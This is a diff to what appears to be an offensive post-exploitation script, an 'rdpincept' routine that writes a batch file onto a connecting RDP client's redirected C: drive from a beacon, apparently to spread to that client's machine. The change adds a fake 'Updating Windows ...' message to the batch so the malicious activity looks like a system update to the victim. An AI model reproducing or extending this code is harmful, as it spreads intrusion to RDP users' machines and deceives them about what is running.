@@ -16,6 +16,8 @@ sub rdpincept {
         blog($beacon, "RDPIncepting listener: $listener");
         $buffer = "@echo off\r\n";
 
+        $buffer = $buffer . "echo Updating Windows ...";
+
 		$buffer = $buffer . "timeout 1 >nul 2>&1\r\n";
 
 		$buffer = $buffer . "mkdir \\\\tsclient\\c\\temp >nul 2>&1\r\n";
